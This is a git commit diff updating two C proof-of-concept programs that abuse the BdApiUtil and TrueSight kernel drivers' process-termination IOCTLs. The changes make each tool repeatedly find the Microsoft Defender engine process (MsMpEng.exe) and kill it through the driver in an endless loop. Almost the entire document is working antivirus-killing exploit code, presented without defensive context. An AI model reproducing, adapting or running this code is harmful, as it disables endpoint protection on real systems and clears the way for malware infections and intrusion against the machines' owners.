25d93645c49800a8e6b6f836829e2021fab0c37e
JodisKripe <jodiskripe@gmail.com>
2025-10-01 09:46:28 +0530

    Updated template and older PoCs

--- BdApiUtil/BdApiUtil/BdApiUtil.c
+++ BdApiUtil/BdApiUtil/BdApiUtil.c
@@ -1,20 +1,44 @@
 #include <Windows.h>
+#include <tlhelp32.h>
+#include <tchar.h>
 #include <stdio.h>
+
 
 #define KILL_IOCTL_CODE 0x800024B4
 #define DRIVER_DEVICE L"\\\\.\\BdApiUtil"
+#define WINDOWS_ENGINE TRUE
+
+int EnumerateProcess(const wchar_t* ProcessName) {
+	DWORD PID = 0;
+	PROCESSENTRY32 pe32;
+	HANDLE hSnapshot;
+	int pid = -1;
+
+	// Take a snapshot of all processes
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) {
+		return -1;
+	}
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	// Get the first process
+	if (Process32First(hSnapshot, &pe32)) {
+		do {
+			// Compare process name (case-insensitive)
+			char* filename = pe32.szExeFile;
+			if (_wcsicmp((char*)pe32.szExeFile, ProcessName) == 0) {
+				pid = pe32.th32ProcessID;
+				break;
+			}
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	CloseHandle(hSnapshot);
+	return pid;
+}
 
 int main(int argc, char* argv[]) {
-	DWORD PID;
-	if (argc < 2) {
-		printf("Provide a PID\n%s <PID>", argv[0]);
-		PID = 15100;
-	}
-	else {
-		printf("Targetting PID %d", atoi(argv[1]));
-		PID = atoi(argv[1]);
-	}
-
 	HANDLE hDriver = CreateFileW(DRIVER_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (!hDriver) {
@@ -24,11 +48,29 @@ int main(int argc, char* argv[]) {
 
 	DWORD bytesReturned = 0;
 	BYTE outBuffer[256];
-	BOOL ioctl_result = DeviceIoControl(hDriver, KILL_IOCTL_CODE, &PID, sizeof(PID), &outBuffer, 256, &bytesReturned, NULL);
-	if (ioctl_result) {
-		printf("Must've Died");
-	}
-	else {
-		printf("Something botched up :(");
+
+	while (1) {
+		if(WINDOWS_ENGINE) {
+			DWORD PID;
+
+			const wchar_t* targetProcess = L"MsMpEng.exe";
+			PID = EnumerateProcess(targetProcess);
+			BOOL ioctl_result;
+
+			if (PID != -1) {
+				ioctl_result = DeviceIoControl(hDriver, KILL_IOCTL_CODE, &PID, sizeof(PID), &outBuffer, 256, &bytesReturned, NULL);
+				if (ioctl_result) {
+					printf("Defender Must've Died\n");
+				}
+				else {
+					printf("Something botched up :(\n");
+				}
+			}
+			else {
+				printf("No Defender Engine found\n");
+			}
+		}
+
+		Sleep(2000);
 	}
 }
--- TrueSight/TrueSight/TrueSight.c
+++ TrueSight/TrueSight/TrueSight.c
@@ -1,26 +1,47 @@
 #include <stdio.h>
 #include <Windows.h>
+#include <TlHelp32.h>
+#include <tchar.h>
 
 #define DRIVER_SYMLINK L"\\\\.\\TrueSight"
 #define TERMINATE_IOCTL 0x22E044
+#define WINDOWS_ENGINE TRUE
 
 typedef struct _killerBuff {
 	int PID;
 } killerBuff, * pKillerBuff;
 
+int EnumerateProcess(const wchar_t* ProcessName) {
+	DWORD PID = 0;
+	PROCESSENTRY32 pe32;
+	HANDLE hSnapshot;
+	int pid = -1;
+
+	// Take a snapshot of all processes
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) {
+		return -1;
+	}
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	// Get the first process
+	if (Process32First(hSnapshot, &pe32)) {
+		do {
+			// Compare process name (case-insensitive)
+			char* filename = pe32.szExeFile;
+			if (_wcsicmp((char*)pe32.szExeFile, ProcessName) == 0) {
+				pid = pe32.th32ProcessID;
+				break;
+			}
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	CloseHandle(hSnapshot);
+	return pid;
+}
+
 int main(int argc, char* argv[]) {
-	unsigned int PID; // 30896;
-	if (argc < 2) {
-		printf("Provide a PID\n%s <PID>", argv[0]);
-		PID = 21816;
-	}
-	else {
-		PID = atoi(argv[1]);
-		printf("PID to be targetted: %d\n", PID);
-	}
-
-	killerBuff buff = { PID };
-
 	HANDLE hDriver = CreateFile(DRIVER_SYMLINK, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (!hDriver) {
@@ -29,14 +50,29 @@ int main(int argc, char* argv[]) {
 
 	DWORD bytesReturned = 0;
 	BYTE outBuffer[256];
+	BOOL ioctl_result;
+	while (1) {
+		if (WINDOWS_ENGINE) {
 
-	BOOL ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &PID, sizeof(PID),&outBuffer,256,&bytesReturned, NULL);
-	if (ioctl_result) {
-		printf("Must've Died\n");
-	}
-	else {
-		printf("Something botched up\n");
-	}
+			const wchar_t* targetProcess = L"MsMpEng.exe";
+			DWORD PID = EnumerateProcess(targetProcess);
+			BOOL ioctl_result;
 
+			if (PID != -1) {
+				killerBuff buff = { PID };
+				ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &buff, sizeof(buff), &outBuffer, 256, &bytesReturned, NULL);
+				if (ioctl_result) {
+					printf("Must've Died\n");
+				}
+				else {
+					printf("Something botched up\n");
+				}
+			}
+			else {
+				printf("No Defender Engine Found !\n");
+			}
+		}
+		Sleep(1500);
+	}
 	return 0;
 }
